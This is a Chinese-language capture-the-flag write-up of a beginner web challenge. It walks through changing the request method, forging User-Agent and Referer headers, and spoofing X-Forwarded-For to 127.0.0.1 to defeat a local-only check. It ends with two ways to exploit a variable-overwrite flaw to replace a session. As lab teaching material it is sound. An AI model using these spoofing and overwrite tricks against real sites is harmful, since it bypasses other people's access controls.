Week1

Hitchhiking_in_the_Galaxy

  • HTTP协议，常⻅状态码、请求头

点击“我要搭顺⻛⻋”跳转到HitchhikerGuide.php，但是⼜⻢上302跳回来了。

302 Found，可以简单的理解为该资源原本确实存在，但已经被临时改变了位置。

抓包访问/HitchhikerGuide.php，发现405 Method Not Allowed，说明请求的⽅法错了。

405 Method Not Allowed，客户端请求中的方法被禁止

常⻅的请求⽅法都试试，GET / POST / PUT / HEAD，发现改为POST请求后成功了。

需要⽤⽆限⾮概率引擎访问，改 User-Agent 为 Infinite Improbability Drive 。

User Agent中文名为用户代理，简称 UA，它是一个特殊字符串头，使得服务器能够识别客户使用的操作系统及版本、CPU 类型、浏览器及版本、浏览器渲染引擎、浏览器语言、浏览器插件等。


必须从Cardinal(在源码能找到它的链接)来，需要更改 Referer 请求头。

Referer，告诉服务器该网页是从哪个页面链接过来的


需要从本地访问，考察的是 X-Forwarded-For 请求头，改为 localhost 或 127.0.0.1 。

X-Forwarded-For（XFF）是用来识别通过HTTP代理或负载均衡方式连接到Web服务器的客户端最原始的IP地址的HTTP请求头字段。

存在变量覆盖，有2种姿势，正常的姿势肯定就是双写绕过，把session覆盖了即可。第二种姿势就是foreach分别对get和post进行，get可以把$filter给覆盖掉，然后post就可以随意覆盖session了，两种方式都可以。
